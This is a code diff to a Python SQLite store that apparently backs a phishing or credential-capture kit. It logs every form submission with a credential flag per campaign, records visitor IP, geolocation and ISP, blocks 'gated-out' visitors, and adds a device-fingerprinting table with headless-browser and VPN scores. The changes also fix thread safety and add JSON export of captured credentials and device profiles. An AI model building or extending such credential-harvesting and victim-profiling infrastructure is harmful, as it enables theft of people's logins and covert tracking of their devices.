@@ -3,9 +3,15 @@
 # Tables:
 #   captures (every form submission, tagged with its campaign)
 #   visitors (de-duplicated by ip+ua, so "unique visitors" is truthful)
+#   blocked  (gated-out visitors, with the reason)
 #
-# Thread-safe: the HTTP server is threaded and shares one connection, so every
-# write path takes a lock and the DB runs in WAL mode.
+# Thread safety: ONE CONNECTION PER THREAD (threading.local), writes serialized
+# by a lock, WAL journal. Sharing a single sqlite3 connection between threads
+# with check_same_thread=False is NOT safe: the HTTP server, the dashboard SSE
+# generator and the TUI all query at the same time, and concurrent statement
+# execution on one connection corrupted memory and SEGFAULTED the process
+# (reproduced: pytest tests/test_proxy.py tests/test_gaps.py → "Fatal Python
+# error: Segmentation fault ... core/capture.py in since()").
 import sqlite3
 import os
 import time
@@ -14,14 +20,21 @@ import threading
 
 class CaptureDB:
     def __init__(self, db_path):
+        self.db_path = db_path
         d = os.path.dirname(db_path)
         if d:
             os.makedirs(d, exist_ok=True)
-        self.conn = sqlite3.connect(db_path, check_same_thread=False)
-        self.conn.execute("PRAGMA journal_mode=WAL")
-        # The HTTP server is threaded: serialize writes on one connection.
-        self._lock = threading.Lock()
-        self.conn.executescript("""
+        # per-thread connections + a write lock: readers never share a
+        # connection with the writer, so no cross-thread sqlite3 use at all.
+        # RLock, not Lock: a write path takes the lock and then creates the
+        # thread's connection (which also registers it), and a plain Lock would
+        # deadlock on that nested acquire.
+        self._local = threading.local()
+        self._lock = threading.RLock()
+        self._conns = []
+        self._closed = False
+        c = self._conn()
+        c.executescript("""
         CREATE TABLE IF NOT EXISTS captures (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             ts REAL,
@@ -50,23 +63,64 @@ class CaptureDB:
             country TEXT,
             reason TEXT
         );
+        CREATE TABLE IF NOT EXISTS intel (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ts REAL,
+            sid TEXT,
+            ip TEXT,
+            city TEXT,
+            country TEXT,
+            isp TEXT,
+            ua TEXT,
+            device_token TEXT,
+            headless INTEGER DEFAULT 0,
+            vpn INTEGER DEFAULT 0,
+            risk INTEGER DEFAULT 0,
+            waves TEXT,
+            summary_json TEXT,
+            data_json TEXT
+        );
+        CREATE INDEX IF NOT EXISTS idx_intel_sid ON intel(sid);
+        CREATE INDEX IF NOT EXISTS idx_intel_token ON intel(device_token);
         """)
         # Visitor de-duplication depends on a UNIQUE(ip, ua) index: without it
         # every page view inserted a new row and "unique visitors" was wrong.
         try:
-            self.conn.execute(
+            c.execute(
                 "CREATE UNIQUE INDEX IF NOT EXISTS idx_visitors_ip_ua ON visitors(ip, ua)")
         except sqlite3.IntegrityError:
             # legacy DB that already accumulated duplicates — collapse then retry
-            self.conn.execute("""DELETE FROM visitors WHERE id NOT IN
-                                 (SELECT MIN(id) FROM visitors GROUP BY ip, ua)""")
-            self.conn.execute(
+            c.execute("""DELETE FROM visitors WHERE id NOT IN
+                         (SELECT MIN(id) FROM visitors GROUP BY ip, ua)""")
+            c.execute(
                 "CREATE UNIQUE INDEX IF NOT EXISTS idx_visitors_ip_ua ON visitors(ip, ua)")
         # Migration: DBs created before campaign/risk support get the columns.
         self._ensure_column("captures", "campaign", "TEXT")
         self._ensure_column("captures", "risk", "INTEGER DEFAULT 0")
         self._ensure_column("captures", "risk_reasons", "TEXT")
-        self.conn.commit()
+        c.commit()
+
+    # ------------------------------------------------------------ connections
+    def _conn(self):
+        """The calling thread's connection, created on first use."""
+        if self._closed:
+            raise RuntimeError("CaptureDB is closed")
+        c = getattr(self._local, "conn", None)
+        if c is None:
+            c = sqlite3.connect(self.db_path, timeout=15)
+            c.execute("PRAGMA journal_mode=WAL")
+            # a second writer must wait, not raise "database is locked"
+            c.execute("PRAGMA busy_timeout=15000")
+            c.execute("PRAGMA synchronous=NORMAL")
+            self._local.conn = c
+            with self._lock:
+                self._conns.append(c)
+        return c
+
+    @property
+    def conn(self):
+        """Kept for callers/tests that reach for the raw handle."""
+        return self._conn()
 
     def _ensure_column(self, table, column, decl):
         cols = [r[1] for r in self.conn.execute(f"PRAGMA table_info({table})")]
@@ -159,8 +213,13 @@ class CaptureDB:
 
     def since(self, after_id, limit=100):
         """Captures newer than `after_id` (ascending) — the SSE feed uses this so
-        the dashboard pushes rows instead of polling the whole table."""
-        rows = self.conn.execute(
+        the dashboard pushes rows instead of polling the whole table.
+
+        Returns [] once the store is closed, so a streaming generator winding
+        down cannot raise (or touch a closed handle)."""
+        if self._closed:
+            return []
+        rows = self._conn().execute(
             "SELECT id, ts, source_url, ip, city, country, isp, ua, device, fields_json,"
             " is_cred, campaign, risk, risk_reasons FROM captures WHERE id > ?"
             " ORDER BY id ASC LIMIT ?", (int(after_id or 0), limit)).fetchall()
@@ -241,10 +300,17 @@ class CaptureDB:
     def export_json(self, path, campaign=None):
         """Machine-readable dump (same shape as the API) for downstream tooling."""
         with open(path, "w", encoding="utf-8") as f:
+            devices = []
+            for r in self.intel_list(limit=1000000):
+                rec = self.intel_get(r["id"])
+                if rec:
+                    devices.append(rec)
             json.dump({"exported_at": time.time(),
                        "stats": self.stats(campaign=campaign),
+                       "intel_stats": self.intel_stats(),
                        "campaigns": self.campaigns(),
-                       "captures": self.all(limit=1000000, campaign=campaign)},
+                       "captures": self.all(limit=1000000, campaign=campaign),
+                       "devices": devices},
                       f, indent=2, default=str)
         return path
 
@@ -265,4 +331,114 @@ class CaptureDB:
         return path
 
     def close(self):
-        self.conn.close()
+        """Mark closed and release every connection this store opened.
+
+        A new statement after close() raises RuntimeError instead of touching a
+        freed handle, which is what turned a shutdown race into a segfault."""
+        self._closed = True
+        with self._lock:
+            conns, self._conns = self._conns, []
+        for c in conns:
+            try:
+                c.close()
+            except Exception:
+                pass
+
+    # ------------------------------------------------------------- intel ----
+    def log_intel(self, sid, ip, city, country, isp, ua, summary, raw, risk=0):
+        """Store one device-intelligence record (full raw dump + summary)."""
+        with self._lock:
+            self._conn().execute(
+                "INSERT INTO intel (ts, sid, ip, city, country, isp, ua, device_token,"
+                " headless, vpn, risk, waves, summary_json, data_json)"
+                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
+                (time.time(), sid or "", ip or "", city or "", country or "", isp or "",
+                 ua or "", (summary.get("fingerprint") or {}).get("device_token") or "",
+                 int((summary.get("automation") or {}).get("headless_score") or 0),
+                 int((summary.get("network_risk") or {}).get("vpn_suspected_score") or 0),
+                 int(risk or 0),
+                 ",".join(str(w) for w in (summary.get("waves") or [])),
+                 json.dumps(summary, default=str), json.dumps(raw, default=str)))
+            self._conn().commit()
+
+    def intel_list(self, limit=50):
+        rows = self._conn().execute(
+            "SELECT id, ts, sid, ip, country, device_token, headless, vpn, risk, ua, waves"
+            " FROM intel ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
+        return [{"id": r[0], "ts": r[1], "sid": r[2], "ip": r[3], "country": r[4],
+                 "device_token": r[5], "headless": r[6], "vpn": r[7], "risk": r[8],
+                 "ua": r[9], "waves": r[10]} for r in rows]
+
+    def intel_get(self, key):
+        """Full record by row id, session id, or 'latest'."""
+        k = str(key or "latest")
+        if k in ("latest", "last", ""):
+            row = self._conn().execute(
+                "SELECT id, ts, sid, ip, city, country, isp, ua, summary_json, data_json"
+                " FROM intel ORDER BY id DESC LIMIT 1").fetchone()
+        elif k.isdigit():
+            row = self._conn().execute(
+                "SELECT id, ts, sid, ip, city, country, isp, ua, summary_json, data_json"
+                " FROM intel WHERE id=?", (int(k),)).fetchone()
+        else:
+            row = self._conn().execute(
+                "SELECT id, ts, sid, ip, city, country, isp, ua, summary_json, data_json"
+                " FROM intel WHERE sid=? ORDER BY id DESC LIMIT 1", (k,)).fetchone()
+        if not row:
+            return None
+        summary = {}
+        try:
+            summary = json.loads(row[8] or "{}")
+        except Exception:
+            summary = {}
+        raw = {}
+        try:
+            raw = json.loads(row[9] or "{}")
+        except Exception:
+            raw = {}
+        rec = dict(summary)
+        rec.update({"id": row[0], "ts": row[1], "sid": row[2], "ip": row[3],
+                    "city": row[4], "country": row[5], "isp": row[6],
+                    "user_agent": summary.get("user_agent") or row[7], "raw": raw})
+        return rec
+
+    def intel_for_session(self, sid):
+        """Raw merged module map for a session — what the next wave must extend."""
+        row = self._conn().execute(
+            "SELECT data_json FROM intel WHERE sid=? ORDER BY id DESC LIMIT 1",
+            (sid or "",)).fetchone()
+        if not row:
+            return {}
+        try:
+            data = json.loads(row[0] or "{}")
+            return data.get("mods") or {}
+        except Exception:
+            return {}
+
+    def intel_update(self, sid, summary, raw, risk=0):
+        """Replace the newest record for a session (a later wave arrived)."""
+        with self._lock:
+            row = self._conn().execute(
+                "SELECT id FROM intel WHERE sid=? ORDER BY id DESC LIMIT 1",
+                (sid or "",)).fetchone()
+            if not row:
+                return None
+            self._conn().execute(
+                "UPDATE intel SET ts=?, device_token=?, headless=?, vpn=?, risk=?,"
+                " waves=?, summary_json=?, data_json=? WHERE id=?",
+                (time.time(), (summary.get("fingerprint") or {}).get("device_token") or "",
+                 int((summary.get("automation") or {}).get("headless_score") or 0),
+                 int((summary.get("network_risk") or {}).get("vpn_suspected_score") or 0),
+                 int(risk or 0), ",".join(str(w) for w in (summary.get("waves") or [])),
+                 json.dumps(summary, default=str), json.dumps(raw, default=str), row[0]))
+            self._conn().commit()
+        return row[0]
+
+    def intel_stats(self):
+        one = self._conn().execute(
+            "SELECT COUNT(*), COUNT(DISTINCT sid), COUNT(DISTINCT device_token),"
+            " SUM(CASE WHEN headless >= 40 THEN 1 ELSE 0 END),"
+            " SUM(CASE WHEN vpn >= 30 THEN 1 ELSE 0 END) FROM intel").fetchone()
+        return {"intel_records": one[0] or 0, "unique_sessions": one[1] or 0,
+                "unique_devices": one[2] or 0, "likely_bots": one[3] or 0,
+                "vpn_suspected": one[4] or 0}
